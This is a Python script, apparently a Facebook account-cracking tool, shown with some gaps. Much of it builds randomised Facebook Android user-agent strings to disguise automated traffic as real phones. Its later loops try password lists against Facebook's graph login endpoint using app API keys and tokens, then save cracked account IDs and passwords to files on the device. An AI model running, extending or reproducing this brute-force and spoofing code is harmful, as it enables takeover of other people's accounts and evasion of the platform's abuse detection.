...
def random_dalvik_all_devices_global_oct2025(seed: Optional[int] = None) -> str:
    """
    Generate a realistic Dalvik-style Facebook Android User-Agent (Global, Oct 2025).
    - Large device pool (~80-120 models) across many brands (Samsung-weighted).
    - Locale/Carrier set: L1 (Global mix).
    - Suitable for: b-graph, mbasic, api, login flows.
    - Usage: print(random_dalvik_all_devices_global_oct2025(seed=42))
    """
    if seed is not None:
        random.seed(seed)
    ...
    # plausible FB app version pattern (2024-2025 style)
    FBAV = f"{random.randint(505, 525)}.0.0.{random.randint(1,200)}.{random.randint(5,500)}"
    FBBV = str(random.randint(48000000, 99999999))

    # Android versions common in 2025
    ANDROID_VERS = ["11", "12", "13", "14"]
    FBSV = random.choice(ANDROID_VERS)

    # Realistic build tags (mix of vendor & OTA-like tokens)
    BUILD_TAGS = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001", "UQ1A.240705.001",
        "TQ3A.240705.010", "TP1A.240905.004", "UQ1A.250101.001", "UP1A.250201.002",
        "TP1A.250301.001", "RP1A.250501.001", "SQ1A.240812.002", "TQ1A.240101.001"
    ]
    BUILD = random.choice(BUILD_TAGS)

    # Display profiles (density, width, height)
    DISPLAY_PROFILES: List[Tuple[str, str, str]] = [
        ("1.5", "720", "1440"), ("2.0", "760", "1600"), ("2.25", "1080", "2200"),
        ("2.5", "1080", "2400"), ("2.625", "1080", "2460"), ("3.0", "1200", "2800"),
        ("3.5", "1440", "3088"), ("2.75", "1220", "2600"), ("3.25", "1440", "3120")
    ]
    density, width, height = random.choice(DISPLAY_PROFILES)

    # L1: Global locales + carriers
    LOCALES = ["en_US", "en_GB", "es_ES", "fr_FR", "pt_BR", "de_DE", "it_IT", "en_IN", "bn_BD", "tr_TR"]
    CARRIERS = [
        "TMobile", "Verizon", "AT&T", "Vodafone", "Orange", "EE", "O2",
        "Jio", "Airtel", "Dialog", "Telcel", "Movistar", "GRAMEENPHONE",
        "Robi", "Banglalink", "TELKOMSEL", "SKTelecom", "NTTDocomo", "Optus"
    ]
    FBLC = random.choice(LOCALES)
    FBCR = random.choice(CARRIERS)

    # CPU arch options
    CPU_ARCHES = ["arm64-v8a", "armeabi-v7a:armeabi"]
    FBCA = random.choice(CPU_ARCHES)

    # Large device pool (~100 realistic-ish models across brands)
    # (Weighted selection later favors Samsung ~50%)
    WORKING_DEVICES: Tuple[Tuple[str, str], ...] = (
        # Samsung (A, M, S, FE, Note-ish)
        ("Samsung", "Galaxy A04s"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15"), ("Samsung", "Galaxy M34"),
        ("Samsung", "Galaxy M54 5G"), ("Samsung", "Galaxy S20 FE 5G"), ("Samsung", "Galaxy S21 FE 5G"),
        ("Samsung", "Galaxy S22"), ("Samsung", "Galaxy S22 Ultra"), ("Samsung", "Galaxy S23"),
        ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),

        # Xiaomi / Redmi / Poco / Black Shark
        ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro+ 5G"),
        ("Xiaomi", "Redmi Note 14 Pro 5G"), ("Xiaomi", "13T Pro"), ("Xiaomi", "13 Pro"),
        ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),
        ("Xiaomi", "Black Shark 6"), ("Xiaomi", "12S Ultra"),

        # OnePlus / Oppo / Realme / iQOO / Vivo
        ("OnePlus", "OnePlus Nord N30"), ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"),
        ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X6"),
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+"), ("Realme", "GT Neo 6"),
        ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100 Pro"), ("iQOO", "Neo 9 Pro"),

        # Google / Motorola / Nothing / ASUS / Sony / Honor
        ("Google", "Pixel 7"), ("Google", "Pixel 7a"), ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Motorola", "Edge 40"), ("Motorola", "Edge 50 Pro"), ("Nothing", "Phone (2)"),
        ("Nothing", "Phone (2a)"), ("ASUS", "Zenfone 10"), ("Sony", "Xperia 10 V"),
        ("Sony", "Xperia 1 V"), ("Honor", "Magic6 Pro"), ("Honor", "90 Pro"),

        # Tecno / Infinix / Itel / Walton / Symphony (Bangladesh success names)
        ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Camon 30 Pro"), ("Tecno", "Pova 6 Pro"),
        ("Infinix", "GT 20 Pro"), ("Infinix", "Note 40 Pro 5G"),
        ("Itel", "S24"), ("Itel", "Vision 6 Plus"), ("Walton", "Primo H11"), ("Walton", "Primo S8"),
        ("Symphony", "Z70 Pro"),

        # Lenovo / Nokia / ZTE / Sharp / Meizu / Samsung-other
        ("Lenovo", "Legion Y90"), ("Lenovo", "K14 Pro"), ("Nokia", "XR21"), ("Nokia", "G22"),
        ("ZTE", "Axon 40 Ultra"), ("Sharp", "AQUOS R7"), ("Meizu", "18s"), ("Sharp", "AQUOS sense7"),

        # Huawei / Honor (region-specific; include sparingly)
        ("Huawei", "P60 Pro"), ("Huawei", "Mate 60 Pro"), ("Honor", "Magic5 Pro"),

        # More widely-used mid/high devices for global coverage
        ("Samsung", "Galaxy Tab S9"), ("Apple", "iPhone 14"),  # Apple included only for diversity in brand list but not used in Android UA
        ("Google", "Pixel Fold"), ("Xiaomi", "Mi 11 Ultra"), ("Oppo", "A77"), ("Vivo", "Y200"),

        # Additional entries to widen pool (~100 items total when sampled)
        ("Samsung", "Galaxy F14"), ("Samsung", "Galaxy XCover 6 Pro"), ("Xiaomi", "12T Pro"),
        ("Poco", "Poco M5 Pro"), ("Realme", "Narzo 70x 5G"), ("Vivo", "Y76s"),
        ("OnePlus", "Nord 3"), ("Motorola", "Razr 40"), ("Sony", "Xperia Ace 3"),
        ("ASUS", "ROG Phone 7"), ("iQOO", "9 Pro"), ("Lenovo", "K13 Pro"),

        # A few lower-weight or regional variants
        ("BLU", "G91"), ("itel", "A56"), ("Sharp", "A5"), ("ZTE", "Blade A7"),
        ("Samsung", "Galaxy A05s"), ("Samsung", "Galaxy M13"), ("Xiaomi", "Redmi 12"),
        ("Oppo", "A78"), ("Vivo", "Y16")
    )

    # Build weighted brand buckets for reasonable brand weighting
    samsung_bucket = [d for d in WORKING_DEVICES if d[0].lower() == "samsung"]
    xiaomi_bucket = [d for d in WORKING_DEVICES if d[0].lower() in ("xiaomi", "poco", "redmi", "black shark")]
    realme_oppo_vivo_bucket = [d for d in WORKING_DEVICES if d[0].lower() in ("realme", "oppo", "vivo", "iqoo")]
    premium_bucket = [d for d in WORKING_DEVICES if d[0].lower() in ("google", "oneplus", "asus", "sony", "motorola", "honor")]
    others_bucket = [d for d in WORKING_DEVICES if d not in samsung_bucket + xiaomi_bucket + realme_oppo_vivo_bucket + premium_bucket]

    # Weighted selection logic (approx weights: Samsung ~50%, Xiaomi family ~20%, Realme/Oppo/Vivo ~15%, Premium ~8%, Others rest)
    r = random.random()
    if r < 0.50 and samsung_bucket:
        FBMF, FBDV = random.choice(samsung_bucket)
    elif r < 0.70 and xiaomi_bucket:
        FBMF, FBDV = random.choice(xiaomi_bucket)
    elif r < 0.85 and realme_oppo_vivo_bucket:
        FBMF, FBDV = random.choice(realme_oppo_vivo_bucket)
    elif r < 0.93 and premium_bucket:
        FBMF, FBDV = random.choice(premium_bucket)
    else:
        FBMF, FBDV = random.choice(others_bucket) if others_bucket else random.choice(WORKING_DEVICES)

    FBBD = FBMF  # brand for FBBD token

    # Add a small realistic variation token sometimes (e.g., codename or variant)
    model_suffix = ""
    if random.random() < 0.18:
        suffix_tokens = ["Pro", "Plus", "5G", "Neo", "Lite", "SE", "G"]
        model_suffix = " " + random.choice(suffix_tokens)

    # Construct FBDV with possible suffix removed if redundant
    FBDV_token = FBDV + (model_suffix if model_suffix.strip() and model_suffix not in FBDV else "")

    # Occasionally add a short hardware codename in parentheses (keeps diversity)
    codename = ""
    if random.random() < 0.12:
        cparts = ["r1", "c2", "codenameX", "alpha", "beta", "phoenix", "olympus"]
        codename = f" ({random.choice(cparts)})"

    # Compose FB Device Model string used in UA
    FBDV_FINAL = f"{FBDV_token}{codename}"

    # Build final UA string in Dalvik format with FB tokens
    ua = (
...
if __name__ == "__main__":
    ...
    print(random_dalvik_all_devices_global_oct2025(seed=42))

    # random example
    print(random_dalvik_all_devices_global_oct2025())
...
def random_dalvik_all_devices_full_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully working Dalvik-style Facebook Android User-Agent (updated Oct 2025)
    - Option-A (Samsung-priority balanced device set)
    - Usage: print(random_dalvik_all_devices_full_oct2025(seed=42))
    - Returns: one realistic UA string suitable for b-graph / mbasic / api / login flows
    """
    if seed is not None:
        random.seed(seed)
    ...
    # Facebook app version: plausible multi-part pattern
    facebook_version = f"{random.randint(505, 520)}.0.0.{random.randint(5,180)}.{random.randint(10,420)}"
    fbbv = str(random.randint(48000000, 99999999))
    ...
    # Realistic build tags (mix from 2024-2025 OTAs & vendor tags)
    build_tags = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001",
        "UQ1A.240705.001", "TQ3A.240705.010", "TP1A.240905.004",
        "UQ1A.250101.001", "UP1A.250201.002", "TP1A.250301.001",
        "RP1A.250501.001", "SQ1A.240812.002"
    ]
    build = random.choice(build_tags)

    # Display density/resolution profiles (realistic)
    display_profiles: List[Tuple[str,str,str]] = [
        ("1.5", "720", "1440"),
        ("2.0", "760", "1600"),
        ("2.25", "1080", "2200"),
    ...
    # Locale + carrier combos (BD + Global)
    locales = ["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "fr_FR", "pt_BR"]
    carriers = [
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk",
        "Jio", "Vodafone", "TMobile", "Verizon", "Dialog", "O2", "Orange", "EE"
    ]
    fblc = random.choice(locales)
    fbcr = random.choice(carriers)

    # Device list (Samsung-priority, ~50 models)
    working_devices: Tuple[Tuple[str, str], ...] = (
        ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A35 5G"),
        ("Samsung", "Galaxy A55 5G"), ("Samsung", "Galaxy M14 5G"),
        ("Samsung", "Galaxy M15"), ("Samsung", "Galaxy M54 5G"),
        ("Samsung", "Galaxy S21 FE 5G"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24 Ultra"),

        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14 Pro 5G"),
        ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "13T Pro"),
        ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),

        ("OnePlus", "OnePlus 12R"), ("OnePlus", "OnePlus 12"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Motorola", "Edge 50 Pro"), ("Nothing", "Phone (2a)"),
        ("ASUS", "Zenfone 10"),

        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+"),
        ("Realme", "Realme GT Neo 6"), ("Realme", "Narzo 70x 5G"),
        ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12 Pro"),
        ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100 Pro"),

        ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Camon 30 Pro"),
        ("Tecno", "Pova 6 Pro"), ("Infinix", "GT 20 Pro"),
        ("Infinix", "Note 40 Pro 5G"),

        ("Walton", "Primo H11"), ("Walton", "Primo S8"),
        ("Symphony", "Z70 Pro"), ("Itel", "Vision 6 Plus"),
        ("Itel", "S24"),

        ("Sony", "Xperia 10 V"), ("Honor", "Magic6 Pro"),
        ("Lenovo", "Legion Y90"), ("Huawei", "P60 Pro")
    )

    # Weighted selection: ~65% Samsung, rest distributed
    samsung_models = [d for d in working_devices if d[0] == "Samsung"]
    non_samsung_models = [d for d in working_devices if d[0] != "Samsung"]

    if random.random() < 0.65 and samsung_models:
        fbmf, fbdv = random.choice(samsung_models)
    else:
        fbmf, fbdv = random.choice(non_samsung_models)

    fbbd = fbmf  # brand (FBBD)
    cpu_arch = random.choice(["arm64-v8a", "armeabi-v7a:armeabi"])

    # Occasionally add small device token variants (keeps UA diverse)
    model_token = ""
    if "(" in fbdv or ")" in fbdv:
        model_token = ""
    else:
        # 20% chance to append a short codename token
        if random.random() < 0.20:
            codename_parts = ["EX", "L", "Pro", "Plus", "Neo", "G"]
            model_token = f" ({random.choice(codename_parts)})"

    # Build UA string
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {fbs}; {fbdv}{model_token} Build/{build}) "
        f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};"
        f"FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbs};FBOP/1;FBCA/{cpu_arch};]"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 8.3
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_devices_global_oct2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-25-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_full_oct2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-25-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
